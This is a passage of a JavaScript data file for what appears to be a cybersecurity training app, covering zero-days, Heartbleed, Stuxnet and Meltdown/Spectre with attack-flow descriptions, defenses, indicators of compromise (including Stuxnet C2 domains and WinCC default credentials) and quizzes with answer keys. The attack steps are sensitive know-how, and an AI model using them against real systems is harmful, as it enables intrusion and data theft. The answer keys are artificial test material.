        description: 'Attacks exploiting previously unknown vulnerabilities for which no patch exists, giving defenders "zero days" to prepare — the most dangerous class of cyber threat.',
        overview: {
            what: 'A zero-day exploit targets a vulnerability that is unknown to the software vendor and the public. The name "zero-day" refers to the fact that developers have had zero days to create and release a patch. These vulnerabilities are highly valued by nation-states, cybercriminals, and exploit brokers because no signature-based detection exists and no patch is available when they are first used.',
            keyPoints: [
                'Zero-day vulnerability = unknown flaw; zero-day exploit = working attack code',
                'Exploit brokers pay $100K to $2.5M+ for zero-days (Zerodium price list)',
                'Nation-states stockpile zero-days for intelligence and offensive operations',
                'Average zero-day remains unpatched for 60-90 days after discovery',
                'Defense relies on behavioral detection, not signatures'
            ],
            examples: [
                { name: 'Stuxnet (2010)', detail: 'Used four Windows zero-day exploits simultaneously to infiltrate and damage Iranian uranium enrichment centrifuges. First known cyber weapon to cause physical destruction.' },
                { name: 'Log4Shell (CVE-2021-44228)', detail: 'Critical RCE in Apache Log4j library affecting millions of Java applications. Within 24 hours of disclosure, active exploitation by nation-states and ransomware groups was observed worldwide.' },
                { name: 'Pegasus / NSO Group', detail: 'Israeli spyware using chains of zero-day exploits in iOS and Android for zero-click smartphone compromise. Used by governments to surveil journalists and dissidents.' }
            ],
            stats: [
                { label: 'Zero-days exploited in 2023', value: '97', note: 'Google TAG + Mandiant tracking' },
                { label: 'Top broker price (iOS)', value: '$2.5M', note: 'Zerodium public price list' },
                { label: 'Avg. time to patch', value: '60-90 days', note: 'after disclosure (RAND)' }
            ]
        },
        attackFlow: {
            title: 'Zero-Day Exploit Lifecycle',
            steps: [
                { phase: 'Vulnerability Discovery', description: 'Researcher, nation-state team, or criminal group discovers an unknown vulnerability through fuzzing, reverse engineering, source code analysis, or variant analysis of known bugs.', icon: '\u{1F50D}' },
                { phase: 'Exploit Development', description: 'Develops reliable exploit code that weaponizes the vulnerability. May chain multiple vulnerabilities for full compromise (sandbox escape + privilege escalation).', icon: '\u{1F528}' },
                { phase: 'Weaponization', description: 'Integrates exploit into a delivery mechanism: malicious document, drive-by download, watering hole website, or zero-click message exploitation.', icon: '\u{2694}' },
                { phase: 'Deployment', description: 'Delivers the zero-day exploit against the target. Used sparingly and against high-value targets to avoid burning the exploit through premature detection.', icon: '\u{1F3AF}' },
                { phase: 'Exploitation', description: 'Exploit executes successfully with no signatures to detect it. Payload achieves code execution, and post-exploitation begins.', icon: '\u{26A1}' },
                { phase: 'Discovery & Disclosure', description: 'Eventually discovered through anomaly detection, incident investigation, or threat research. Vendor is notified, emergency patch is developed and released.', icon: '\u{1F6A8}' }
            ]
        },
        defense: {
            detection: [
                'Behavioral and heuristic detection that identifies suspicious actions, not known signatures',
                'Sandboxing and detonation chambers for files and URLs',
                'Endpoint Detection and Response (EDR) monitoring for anomalous process behavior',
                'Network traffic analysis for unusual patterns (C2 beaconing, data exfiltration)',
                'Threat intelligence sharing to get IOCs as quickly as possible after initial discovery'
            ],
            prevention: [
                'Defense-in-depth architecture — assume any single layer can be bypassed',
                'Application sandboxing and process isolation to limit exploit impact',
                'Exploit mitigation technologies: ASLR, DEP, CFI, process containers',
                'Reduce attack surface: disable unnecessary services, features, and plugins',
                'Virtual patching via WAF/IPS rules as a stopgap when patches aren\'t available'
            ],
            response: [
                'Apply vendor patch immediately when released — zero-day window is closing',
                'Deploy virtual patches (WAF/IPS rules) if vendor patch is not yet available',
                'Threat hunt across the environment for indicators of the zero-day exploit',
                'Review logs from the vulnerability disclosure date backward to find early exploitation',
                'Participate in threat intelligence sharing to help protect the broader community'
            ]
        },
        indicators: {
            network: [
                'Exploit traffic patterns that do not match any known IDS/IPS signatures',
                'Unexpected outbound C2 communications from systems that were previously clean',
                'Anomalous network behavior immediately following interaction with specific file types or URLs',
                'Threat intel advisories about active exploitation of a newly disclosed vulnerability',
                'Connections to IP addresses associated with known nation-state infrastructure'
            ],
            host: [
                'Application crashes or unexpected behavior in commonly targeted software (browsers, Office, PDF readers)',
                'EDR alerting on anomalous process trees (e.g., Excel spawning PowerShell)',
                'Exploit mitigation triggers: ASLR bypass attempts, DEP violations, CFI violations',
                'Sandbox escape indicators: processes accessing resources outside their container',
                'Memory corruption artifacts detected by hardware-based security features (Intel CET)'
            ],
            behavioral: [
                'Anomalous system behavior that begins after opening a specific document or visiting a website',
                'Multiple unrelated organizations reporting similar novel exploitation simultaneously',
                'Security vendor advisories with CVSS 9.0+ and "exploitation in the wild" status',
                'Vendor releasing emergency out-of-band patches outside normal update cycles',
                'Exploit broker communications or dark web chatter about new unpatched vulnerabilities'
            ],
            tools: ['Behavioral EDR (CrowdStrike, SentinelOne, Defender ATP)', 'Sandboxing (Any.Run, Cuckoo, Joe Sandbox)', 'Memory forensics (Volatility)', 'YARA rules (behavioral patterns)', 'Exploit mitigation validation (Windows Exploit Guard)', 'Threat intel platforms (Mandiant, Recorded Future)', 'CISA Known Exploited Vulnerabilities catalog', 'Google TAG / Project Zero advisories']
        },
        interactive: {
            scenario: 'CISA releases an emergency advisory at 9:00 AM stating that a critical zero-day vulnerability (CVSS 10.0) is being actively exploited in a VPN appliance used by your organization. The vendor has NOT yet released a patch but has published indicators of compromise and a recommended workaround (disable a specific feature). Your security scan shows 23 of these VPN appliances deployed across your enterprise. Your CISO asks for an immediate action plan. What do you recommend?',
            options: [
                'Wait for the vendor to release a proper patch before making changes — applying workarounds could break VPN access',
                'Immediately implement the vendor workaround on all 23 appliances, hunt for the published IOCs across your environment, deploy virtual patches via IPS, prepare for full patching when available, and brief leadership on the risk',
                'Shut down all 23 VPN appliances immediately until a patch is available',
                'Add the IOCs to your SIEM and monitor for exploitation — take action only if you see activity'
            ],
            correct: 1,
            explanation: 'With a CVSS 10.0 zero-day under active exploitation, waiting is not an option — you are already a target. The balanced approach: (1) Apply the vendor workaround immediately to close the attack vector (yes, it may impact some functionality, but that is preferable to compromise), (2) Hunt for published IOCs to determine if you are already breached, (3) Deploy virtual patches via IPS/WAF as an additional layer, (4) Prepare for rapid patch deployment the moment the vendor releases one, (5) Brief leadership because this is a high-visibility risk. Shutting down all VPNs would stop business operations — the workaround allows continued use while eliminating the vulnerable feature.'
        },
        quiz: [
            { question: 'What makes a vulnerability a "zero-day"?', options: ['It was discovered today', 'The vendor has had zero days to create a patch — the vulnerability was unknown before exploitation', 'It only affects systems that are zero days old', 'It can be exploited in zero seconds'], correct: 1, explanation: 'A zero-day vulnerability is unknown to the vendor and public, meaning there has been zero time (zero days) to develop a patch. Once disclosed, the race begins between patching and exploitation.' },
            { question: 'Why are zero-day exploits so valuable on the black market?', options: ['They are easy to develop', 'No signatures exist to detect them and no patch exists to prevent them', 'They always work against every system', 'They are legal to sell'], correct: 1, explanation: 'Zero-days bypass all signature-based detection (antivirus, IDS) and no patch is available. This makes them the most reliable way to compromise even well-defended targets, commanding prices up to $2.5M+.' },
            { question: 'Stuxnet is notable in zero-day history because it:', options: ['Was the first virus ever created', 'Used four zero-day exploits simultaneously and was the first cyber weapon to cause physical destruction', 'Infected more computers than any other malware', 'Only affected consumer devices'], correct: 1, explanation: 'Stuxnet used an unprecedented four zero-days in one campaign, targeting Iranian nuclear centrifuges. It crossed the digital-physical boundary, causing real-world industrial damage.' },
            { question: 'What is the BEST detection approach for zero-day exploits since no signatures exist?', options: ['Better antivirus signatures', 'Behavioral analysis and anomaly detection that identifies suspicious actions', 'Monitoring social media for exploit announcements', 'Stronger passwords'], correct: 1, explanation: 'Since zero-days have no known signatures, behavioral detection is key — monitoring for anomalous process behavior, unusual system calls, suspicious memory operations, and abnormal network traffic.' },
            { question: 'What is "virtual patching"?', options: ['Updating virtual machines', 'Using WAF/IPS rules to block known exploit patterns as a stopgap when a vendor patch is not yet available', 'Patching software in a virtual environment', 'A theoretical patch that doesn\'t actually fix the vulnerability'], correct: 1, explanation: 'Virtual patching deploys WAF or IPS rules that detect and block the specific exploit pattern, providing protection while the vendor develops and tests an actual code fix.' },
            { question: 'The Log4Shell vulnerability was particularly severe because:', options: ['It only affected one application', 'The Log4j library is embedded in millions of Java applications worldwide, creating an enormous attack surface', 'It required physical access to exploit', 'A patch was available before the exploit'], correct: 1, explanation: 'Log4j is used by virtually every Java application. Log4Shell (CVE-2021-44228) allowed trivial remote code execution via a simple string in log input, affecting millions of applications, services, and devices globally.' }
        ]
    },

    // =================================================================
    // 17. HEARTBLEED
    // =================================================================
    HEARTBLEED: {
        code: 'HEARTBLEED',
        title: 'Heartbleed (CVE-2014-0160)',
        icon: '\u{1F494}',
        severity: 'critical',
        color: '#a855f7',
        description: 'A critical vulnerability in OpenSSL\'s TLS heartbeat extension that allowed attackers to read up to 64KB of server memory per request, exposing private keys, credentials, and session data.',
        overview: {
            what: 'Heartbleed (CVE-2014-0160) was a catastrophic buffer over-read vulnerability in OpenSSL 1.0.1 through 1.0.1f. The TLS/DTLS heartbeat extension (RFC 6520) allows one endpoint to send a "heartbeat request" with a payload and length field. The vulnerable code trusted the attacker-supplied length without bounds checking, returning up to 64KB of adjacent server memory — potentially including private keys, session tokens, passwords, and other sensitive data. Because it left no trace in server logs, exploitation was undetectable.',
            keyPoints: [
                'Affected OpenSSL 1.0.1 through 1.0.1f (2 years in the wild before discovery)',
                'The heartbeat extension sends a payload and length — the bug trusted the claimed length without verification',
                'Each exploit request could leak up to 64KB of server memory',
                'No authentication needed — any client could exploit any vulnerable server',
                'Left no trace in standard server logs, making exploitation virtually undetectable'
            ],
            examples: [
                { name: 'Community Health Systems Breach (2014)', detail: 'Attackers exploited Heartbleed to steal credentials from a Juniper VPN device, then used those credentials to exfiltrate 4.5 million patient records from the hospital network.' },
                { name: 'Canadian Revenue Agency (2014)', detail: 'An attacker exploited Heartbleed against CRA servers to steal Social Insurance Numbers of approximately 900 Canadian taxpayers during tax filing season.' },
                { name: 'Cloudflare Challenge (2014)', detail: 'Cloudflare publicly challenged researchers to extract a private SSL key from a Heartbleed-vulnerable server. Two researchers succeeded within hours, proving the vulnerability could leak cryptographic keys.' }
            ],
            stats: [
                { label: 'Servers affected', value: '~17%', note: 'of all SSL/TLS web servers at disclosure' },
                { label: 'Time in the wild', value: '~2 years', note: 'Dec 2011 to Apr 2014 unpatched' },
                { label: 'CVSS score', value: '7.5', note: 'High — no auth required, memory disclosure' }
            ]
        },
        attackFlow: {
            title: 'Heartbleed Exploitation Flow',
            steps: [
                { phase: 'Target Identification', description: 'Attacker scans for servers running vulnerable OpenSSL versions (1.0.1 through 1.0.1f). Tools like Nmap with ssl-heartbleed script or Masscan identify targets at scale.', icon: '\u{1F50D}' },
                { phase: 'Heartbeat Request Crafting', description: 'Attacker sends a TLS heartbeat request with a small payload (e.g., 1 byte) but claims a large length (up to 65,535 bytes). The malformed request exploits the missing bounds check.', icon: '\u{1F4DD}' },
                { phase: 'Memory Over-Read', description: 'The vulnerable OpenSSL code allocates a response buffer based on the claimed length, copies the original payload, then reads adjacent heap memory to fill the remaining space — returning up to 64KB of server memory.', icon: '\u{1F4BE}' },
                { phase: 'Data Harvesting', description: 'Attacker repeats the request thousands of times, each time receiving a different 64KB slice of heap memory. Over time, this reveals session cookies, credentials, private keys, and application data.', icon: '\u{1F4E5}' },
                { phase: 'Credential Extraction', description: 'Leaked memory is parsed for high-value data: TLS private keys (allows decryption of all past/future traffic), session tokens, usernames, passwords, and API keys.', icon: '\u{1F511}' },
                { phase: 'Silent Exploitation', description: 'Because the heartbeat response looks like normal TLS traffic and the server logs no error, the attacker operates completely undetected. No crash, no anomaly, no evidence.', icon: '\u{1F47B}' }
            ]
        },
        defense: {
            detection: [
                'Monitor for abnormally large TLS heartbeat responses (larger than the request payload)',
                'IDS/IPS signatures for Heartbleed exploit patterns (oversized heartbeat length fields)',
                'Network traffic analysis for repeated heartbeat requests from the same source',
                'Memory forensics on suspected compromised servers to identify leaked data patterns',
                'Check OpenSSL version strings against known-vulnerable versions'
            ],
            prevention: [
                'Patch OpenSSL to 1.0.1g or later immediately (or recompile with -DOPENSSL_NO_HEARTBEATS)',
                'Revoke and reissue all SSL/TLS certificates after patching (private keys may have been compromised)',
                'Force password resets for all users on affected services',
                'Invalidate all active session tokens and API keys',
                'Implement automated vulnerability scanning for critical library versions'
            ],
            response: [
                'Patch all vulnerable OpenSSL instances as the highest priority',
                'Assume private keys were compromised — revoke and reissue all certificates',
                'Rotate all credentials (passwords, API keys, session tokens) that passed through affected servers',
                'Review network logs for evidence of exploitation (repeated heartbeat requests from unusual sources)',
                'Notify affected users and recommend password changes on any service that used the vulnerable servers'
            ]
        },
        indicators: {
            network: [
                'TLS heartbeat responses significantly larger than the corresponding request payloads',
                'High volume of heartbeat requests from a single IP address in a short time period',
                'Heartbeat request payloads of 1 byte with claimed lengths of 65,535 bytes',
                'Repeated TLS handshake + heartbeat sequences without normal application data exchange',
                'Traffic patterns consistent with automated exploitation tools (ssltest.py, Metasploit module)'
            ],
            host: [
                'OpenSSL version 1.0.1 through 1.0.1f installed on the system',
                'Heartbeat extension enabled in TLS configuration (default in vulnerable versions)',
                'No log entries despite evidence of exploitation (Heartbleed is silent by design)',
                'Unexpected certificate reissuance or key rotation by hosting providers post-disclosure',
                'Memory dumps containing fragments of user sessions, credentials, or private key material'
            ],
            behavioral: [
                'Sudden credential compromises across multiple accounts with no phishing evidence',
                'SSL/TLS certificate key compromise detected by Certificate Transparency logs',
                'Session hijacking incidents correlating with Heartbleed-vulnerable server exposure',
                'Mass credential resets triggered by affected service providers post-disclosure',
                'Unexplained data breaches on services running vulnerable OpenSSL versions'
            ],
            tools: ['Nmap ssl-heartbleed script', 'Metasploit openssl_heartbleed module', 'ssltest.py (Filippo Valsorda)', 'Qualys SSL Labs test', 'OpenSSL version checker', 'Heartbleed-Masstest', 'sslyze', 'testssl.sh']
        },
        interactive: {
            scenario: 'It\'s April 8, 2014 — the Heartbleed disclosure just dropped. Your organization runs 200+ web servers using OpenSSL for HTTPS. Your security team confirms that 147 servers are running vulnerable versions (1.0.1a through 1.0.1f). These servers handle customer logins, payment processing, and API authentication. Your CTO asks: "What do we need to do beyond just patching?" What is the complete remediation plan?',
            options: [
                'Patch OpenSSL on all 147 servers and resume normal operations — the vulnerability is fixed once patched',
                'Patch all servers, then revoke and reissue all SSL certificates, force password resets for all users, invalidate all active sessions and API keys, and notify customers — because private keys and credentials may have already been silently stolen',
                'Take all 147 servers offline until a thorough forensic investigation determines if they were exploited',
                'Patch the servers and monitor for suspicious activity over the next 30 days before taking further action'
            ],
            correct: 1,
            explanation: 'Patching alone is critically insufficient. Because Heartbleed leaves no trace and was exploitable for 2 years, you must ASSUME compromise. The complete plan: (1) Patch immediately to stop the bleeding, (2) Revoke and reissue ALL SSL/TLS certificates because private keys may have been read from memory (enabling past and future traffic decryption), (3) Force password resets because credentials in transit may have been captured, (4) Invalidate all sessions/API keys because tokens may have been leaked, (5) Notify customers because their data may have been exposed. Waiting to "see if you were exploited" is futile — the whole point of Heartbleed is that exploitation is invisible.'
        },
        quiz: [
            { question: 'What is the root cause of the Heartbleed vulnerability?', options: ['A buffer overflow that crashes the server', 'A missing bounds check on the heartbeat payload length, causing a buffer over-read', 'An encryption weakness in the TLS protocol', 'A SQL injection in the OpenSSL configuration'], correct: 1, explanation: 'Heartbleed is a buffer over-read: the code trusted the attacker-supplied length field without checking if it matched the actual payload size, returning adjacent heap memory in the response.' },
            { question: 'Why was Heartbleed particularly dangerous compared to other vulnerabilities?', options: ['It required no authentication, left no server logs, and could leak private keys', 'It allowed remote code execution', 'It could crash servers causing denial of service', 'It only affected outdated systems'], correct: 0, explanation: 'Heartbleed was devastating because: (1) any anonymous client could exploit it, (2) it left absolutely no trace in logs, and (3) it could leak the server\'s private TLS key, enabling decryption of all past and future traffic.' },
            { question: 'How much memory could an attacker read per Heartbleed request?', options: ['Up to 1KB', 'Up to 64KB', 'Up to 1MB', 'The entire server memory'], correct: 1, explanation: 'Each heartbeat response could return up to 64KB (65,535 bytes) of adjacent heap memory. Attackers repeated the request thousands of times to harvest different memory segments.' },
            { question: 'Why must SSL/TLS certificates be revoked AFTER patching Heartbleed?', options: ['Because the patch invalidates old certificates', 'Because the server\'s private key may have been leaked from memory, allowing attackers to impersonate the server or decrypt traffic', 'Because certificates expire when OpenSSL is updated', 'Because new certificates are faster'], correct: 1, explanation: 'If the private key was leaked via Heartbleed, an attacker can impersonate the server (MITM) and decrypt recorded traffic (if not using forward secrecy). Revoking and reissuing certificates is essential.' },
            { question: 'What RFC defines the TLS heartbeat extension exploited by Heartbleed?', options: ['RFC 5246', 'RFC 6520', 'RFC 7540', 'RFC 8446'], correct: 1, explanation: 'RFC 6520 defines the TLS/DTLS Heartbeat Extension, designed as a keep-alive mechanism. The implementation flaw in OpenSSL — not the RFC itself — caused Heartbleed.' }
        ]
    },

    // =================================================================
    // 18. STUXNET
    // =================================================================
    STUXNET: {
        code: 'STUXNET',
        title: 'Stuxnet',
        icon: '\u{2622}',
        severity: 'critical',
        color: '#a855f7',
        description: 'The first known cyber weapon — a sophisticated worm targeting Iranian nuclear centrifuges using four zero-day exploits, PLC manipulation, and air-gap jumping via USB drives.',
        overview: {
            what: 'Stuxnet was a highly sophisticated computer worm discovered in 2010, widely attributed to a joint U.S.-Israeli operation (codenamed "Olympic Games"). It targeted Siemens Step 7 software controlling programmable logic controllers (PLCs) operating uranium enrichment centrifuges at Iran\'s Natanz facility. Stuxnet used an unprecedented four zero-day exploits, stolen digital certificates, and rootkit techniques to cross air gaps via USB drives, propagate through networks, and silently sabotage centrifuge operations while reporting normal readings to operators.',
            keyPoints: [
                'Used 4 zero-day exploits simultaneously — unprecedented sophistication',
                'Targeted Siemens S7-315/S7-417 PLCs controlling centrifuge frequency converters',
                'Jumped air-gapped networks via infected USB drives',
                'Sabotaged centrifuges by altering rotation speeds while displaying normal telemetry to operators',
                'First known case of a cyberattack causing physical destruction of industrial equipment'
            ],
            examples: [
                { name: 'Natanz Uranium Enrichment (2010)', detail: 'Stuxnet destroyed approximately 1,000 of 5,000 IR-1 centrifuges at Natanz by alternating rotation speeds between 1,410 Hz and 2 Hz, causing mechanical failure while SCADA screens showed normal 1,064 Hz operation.' },
                { name: 'Flame Malware (2012)', detail: 'A related cyber-espionage tool sharing code modules with Stuxnet, used for intelligence gathering across the Middle East. Demonstrated the broader toolset behind the Olympic Games program.' },
                { name: 'Duqu (2011)', detail: 'A reconnaissance worm sharing Stuxnet\'s code platform (Tilded), designed to gather intelligence on industrial control systems — likely a precursor or companion to Stuxnet operations.' }
            ],
            stats: [
                { label: 'Zero-days used', value: '4', note: 'Windows Shell LNK, Print Spooler, Task Scheduler, Server Service' },
                { label: 'Centrifuges destroyed', value: '~1,000', note: 'of 5,000 IR-1 centrifuges at Natanz' },
                { label: 'Countries infected', value: '115+', note: 'Iran, Indonesia, India had highest infection rates' }
            ]
        },
        attackFlow: {
            title: 'Stuxnet Attack Chain',
            steps: [
                { phase: 'Initial Infection (USB)', description: 'Stuxnet was introduced to the air-gapped Natanz network via infected USB drives. The LNK vulnerability (CVE-2010-2568) auto-executed the payload when the USB contents were viewed in Windows Explorer.', icon: '\u{1F4BB}' },
                { phase: 'Network Propagation', description: 'Once inside, Stuxnet spread across the network using multiple vectors: Windows Server Service vulnerability (MS08-067), Print Spooler zero-day, network shares, WinCC database connections, and Siemens Step 7 project files.', icon: '\u{1F310}' },
                { phase: 'Target Validation', description: 'On each infected machine, Stuxnet checked for Siemens Step 7 software and specific PLC configurations (S7-315/S7-417 with particular frequency converter setups). If the target didn\'t match, the worm remained dormant.', icon: '\u{1F50E}' },
                { phase: 'PLC Code Injection', description: 'On matching systems, Stuxnet injected malicious code into the PLC program, intercepting commands between Step 7 and the frequency converters controlling centrifuge rotation speeds.', icon: '\u{1F489}' },
                { phase: 'Sabotage Execution', description: 'The injected code periodically altered centrifuge speeds — ramping from normal 1,064 Hz to 1,410 Hz, then dropping to 2 Hz. This caused mechanical stress, vibration, and eventual centrifuge destruction over weeks to months.', icon: '\u{1F4A5}' },
                { phase: 'Stealth & Deception', description: 'A rootkit component intercepted PLC status queries and replayed pre-recorded "normal" readings to the SCADA display. Operators saw healthy centrifuges while they were being destroyed. Stolen Realtek and JMicron certificates signed the drivers.', icon: '\u{1F576}' }
            ]
        },
        defense: {
            detection: [
                'Anomaly detection on industrial control system (ICS) network traffic patterns',
                'Integrity monitoring of PLC program code for unauthorized modifications',
                'USB device control policies with allowlisting and automatic scanning',
                'Comparison of reported sensor values against independent physical measurements',
                'Host-based monitoring for drivers signed with revoked or stolen certificates'
            ],
            prevention: [
                'Strict USB device control: disable autorun, whitelist approved devices, enforce scanning',
                'Air-gap discipline: dedicated systems for ICS networks, no dual-use workstations',
                'Application whitelisting on SCADA/HMI workstations',
                'PLC code integrity verification and change management',
                'Network segmentation between IT and OT (Operational Technology) environments per IEC 62443'
            ],
            response: [
                'Isolate affected ICS/SCADA networks from all external connectivity immediately',
                'Verify PLC program integrity by comparing against known-good offline backups',
                'Inspect all USB devices and removable media for malware',
                'Engage ICS-specialized incident response teams (not standard IT responders)',
                'Validate physical process readings against independent sensors to detect spoofed telemetry'
            ]
        },
        indicators: {
            network: [
                'Unusual traffic between engineering workstations and PLCs outside maintenance windows',
                'Attempts to access Siemens WinCC database (default credentials: WinCCConnect/2WSXcder)',
                'Propagation attempts via SMB (MS08-067) or Print Spooler across ICS network segments',
                'DNS queries for Stuxnet C2 domains (mypremierfutbol.com, todaysfutbol.com)',
                'RPC traffic indicative of Windows Task Scheduler exploitation'
            ],
            host: [
                'Files signed with revoked Realtek Semiconductor or JMicron Technology certificates',
                'Modified Siemens Step 7 DLL files (s7otbxdx.dll replaced with malicious version)',
                'Rootkit drivers hiding files and registry entries related to the worm',
                'Suspicious .LNK files on USB drives exploiting the Windows Shell vulnerability',
                'Scheduled tasks created via Windows Task Scheduler zero-day for privilege escalation'
            ],
            behavioral: [
                'Centrifuge failure rates significantly above normal operating parameters',
                'Discrepancy between SCADA-reported values and physical measurements (pressure, vibration, RPM)',
                'Engineering workstations executing unusual processes when Step 7 projects are opened',
                'Increased rate of USB drive usage across air-gapped facility workstations',
                'PLC program modifications without corresponding change management records'
            ],
            tools: ['Siemens SIMATIC tools (PLC verification)', 'ICS-CERT advisories', 'YARA rules for Stuxnet signatures', 'Industrial protocol analyzers (Wireshark with S7comm dissector)', 'USB device forensics tools', 'Volatility (memory analysis)', 'IDA Pro / Ghidra (malware reverse engineering)', 'Dragos ICS threat intelligence']
        },
        interactive: {
            scenario: 'You are the cybersecurity lead at a water treatment facility. A technician reports that three PLCs controlling chemical dosing pumps have been behaving erratically — the pumps occasionally run at incorrect rates for 30-second intervals before returning to normal. However, the SCADA display has shown normal readings throughout. The facility recently discovered that a contractor used a personal USB drive on an engineering workstation. What is happening and what do you do?',
            options: [
                'The PLCs are malfunctioning due to age — schedule hardware replacement and continue normal operations',
                'The USB drive likely introduced malware that is manipulating PLC code while spoofing SCADA readings — immediately isolate the ICS network, verify PLC code integrity against offline backups, forensically image the engineering workstation and USB drive, and install independent physical sensors to validate chemical dosing levels',
                'The SCADA display is correct and the technician is mistaken — have the technician recalibrate their instruments',
                'Update the PLC firmware and reboot the SCADA system to clear any temporary glitches'
            ],
            correct: 1,
            explanation: 'This scenario mirrors the Stuxnet attack pattern: (1) an unauthorized USB device as the infection vector, (2) PLC manipulation causing incorrect physical behavior, and (3) SCADA display spoofing showing normal readings while equipment is being misused. The fact that physical observation differs from SCADA telemetry is the critical red flag — it means the reporting layer has been compromised. Immediate isolation prevents further damage, PLC code verification against known-good backups detects modifications, forensic analysis of the workstation and USB drive identifies the malware, and independent sensors provide trustworthy readings until the system integrity is restored.'
        },
        quiz: [
            { question: 'How did Stuxnet initially reach the air-gapped Natanz facility?', options: ['Through the internet via a firewall vulnerability', 'Via infected USB drives exploiting a Windows LNK vulnerability', 'Through satellite communications', 'Via a compromised supplier\'s email'], correct: 1, explanation: 'Stuxnet crossed the air gap via USB drives. The LNK vulnerability (CVE-2010-2568) caused the malware to auto-execute when the USB contents were simply viewed in Windows Explorer — no user click required.' },
            { question: 'How many zero-day exploits did Stuxnet use simultaneously?', options: ['1', '2', '4', '7'], correct: 2, explanation: 'Stuxnet used 4 zero-day exploits: Windows Shell LNK (CVE-2010-2568), Print Spooler (CVE-2010-2729), Task Scheduler privilege escalation (CVE-2010-3338), and Server Service (CVE-2008-4250/MS08-067).' },
            { question: 'What did Stuxnet do to the centrifuges at Natanz?', options: ['Shut them down immediately', 'Altered rotation speeds to cause mechanical failure while displaying normal readings to operators', 'Caused them to overheat and explode', 'Encrypted the PLC firmware for ransom'], correct: 1, explanation: 'Stuxnet alternated centrifuge speeds between 1,410 Hz and 2 Hz (normal was 1,064 Hz), causing mechanical stress and destruction. Meanwhile, a rootkit replayed normal telemetry to the SCADA display, hiding the sabotage.' },
            { question: 'Why did Stuxnet use stolen digital certificates from Realtek and JMicron?', options: ['To encrypt its communications', 'To sign its kernel-mode drivers so Windows would load them without security warnings', 'To bypass antivirus subscriptions', 'To impersonate legitimate software updates'], correct: 1, explanation: 'Windows requires kernel-mode drivers to be signed by trusted certificates. Stuxnet used stolen Realtek and JMicron code-signing certificates to make its rootkit drivers appear legitimate, allowing them to load without triggering security alerts.' },
            { question: 'What made Stuxnet historically significant in cybersecurity?', options: ['It was the largest data breach in history', 'It was the first known cyber weapon to cause physical destruction of industrial equipment', 'It was the fastest-spreading virus ever', 'It was the first ransomware attack'], correct: 1, explanation: 'Stuxnet was the first publicly known instance of a cyberattack causing physical destruction. It proved that software could cross into the physical world, destroying hardware (centrifuges) through code — ushering in the era of cyber warfare.' }
        ]
    },

    // =================================================================
    // 19. MELTDOWN & SPECTRE
    // =================================================================
    MELTDOWN_SPECTRE: {
        code: 'MELTDOWN_SPECTRE',
        title: 'Meltdown & Spectre',
        icon: '\u{1F9CA}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Hardware-level CPU vulnerabilities exploiting speculative execution to leak kernel memory (Meltdown) and cross-process data (Spectre) through microarchitectural side channels.',
        overview: {
            what: 'Meltdown (CVE-2017-5754) and Spectre (CVE-2017-5753, CVE-2017-5715) are hardware vulnerabilities in modern CPUs disclosed in January 2018. They exploit speculative execution — a performance optimization where CPUs execute instructions ahead of time and discard incorrect predictions. Meltdown breaks the isolation between user applications and the OS kernel, allowing any program to read kernel memory. Spectre tricks other applications into leaking their own data. Both use cache-based side channels to extract data from speculatively executed instructions, even though those instructions are architecturally "rolled back."',
            keyPoints: [
                'Meltdown: reads arbitrary kernel memory from user space by exploiting out-of-order execution (primarily Intel CPUs)',
                'Spectre Variant 1 (Bounds Check Bypass): manipulates branch prediction to access out-of-bounds memory in another process',
                'Spectre Variant 2 (Branch Target Injection): poisons the branch target buffer to redirect speculative execution',
                'Both use cache timing side channels (Flush+Reload, Prime+Probe) to extract leaked data',
                'Hardware-level flaw — cannot be fully fixed without new CPU designs; mitigations carry performance penalties'
            ],
            examples: [
                { name: 'Cloud Provider Isolation Breach', detail: 'Researchers demonstrated Meltdown could read host kernel memory from within a virtual machine, breaking the fundamental isolation guarantees of cloud computing (AWS, Azure, GCP all required emergency patching).' },
                { name: 'Browser-Based Spectre (2018)', detail: 'Spectre was demonstrated in JavaScript within web browsers — a malicious webpage could read data from other browser tabs or the browser process itself. Led to Site Isolation in Chrome and reduced timer precision in all browsers.' },
                { name: 'Intel SGX Bypass (Foreshadow/L1TF)', detail: 'A Spectre-class variant (CVE-2018-3615) could extract data from Intel SGX secure enclaves — hardware-level trusted execution environments designed to be impervious to OS-level attacks.' }
            ],
            stats: [
                { label: 'CPUs affected', value: 'Billions', note: 'Nearly every Intel CPU since 1995 (Meltdown), most modern CPUs (Spectre)' },
                { label: 'Performance impact', value: '5-30%', note: 'Workload-dependent penalty from kernel mitigations' },
                { label: 'Spectre variants discovered', value: '15+', note: 'New variants continue to emerge years later' }
            ]
        },
        attackFlow: {
            title: 'Speculative Execution Attack Flow',
            steps: [
                { phase: 'Target Selection', description: 'Attacker identifies a target: kernel memory (Meltdown), another process\'s data (Spectre V1), or cross-VM data in cloud environments. The attack runs entirely in user space.', icon: '\u{1F3AF}' },
                { phase: 'Speculative Trigger', description: 'For Meltdown: execute a memory read of a kernel address — the CPU speculatively completes the read before the permission check raises an exception. For Spectre: mistrain the branch predictor to speculatively execute a gadget that reads the target data.', icon: '\u{26A1}' },
                { phase: 'Cache Loading', description: 'During speculative execution (before the CPU realizes the mistake and rolls back), the leaked data is used as an index to load a specific cache line. Although the speculation is discarded architecturally, the cache state change persists.', icon: '\u{1F4E6}' },
                { phase: 'Side-Channel Extraction', description: 'Attacker measures memory access times using Flush+Reload or Prime+Probe techniques. The cache line that was speculatively loaded will be faster to access, revealing the value of the leaked byte.', icon: '\u{23F1}' },
                { phase: 'Byte-by-Byte Reconstruction', description: 'The attack repeats for each byte of target memory. At approximately 500KB/s (Meltdown on vulnerable Intel CPUs), the attacker reconstructs kernel memory, encryption keys, passwords, or other sensitive data.', icon: '\u{1F9E9}' },
                { phase: 'Data Exploitation', description: 'Extracted data may include kernel ASLR layout (defeating address randomization), cryptographic keys, credentials, or other process secrets — enabling further attacks or complete system compromise.', icon: '\u{1F4A3}' }
            ]
        },
        defense: {
            detection: [
                'Performance counter monitoring for abnormal cache miss patterns and branch mispredictions',
                'Hardware performance counters (HPC) tracking speculative execution anomalies',
                'Detection of Flush+Reload or Prime+Probe access patterns via OS-level monitoring',
                'Cloud provider monitoring for cross-VM cache timing attacks',
                'Runtime detection of Spectre gadgets in JIT-compiled code (browsers, runtimes)'
            ],
            prevention: [
                'Kernel Page Table Isolation (KPTI/KAISER) — separates user and kernel page tables to prevent Meltdown',
                'Retpoline — replaces indirect branches with return-based sequences to mitigate Spectre V2',
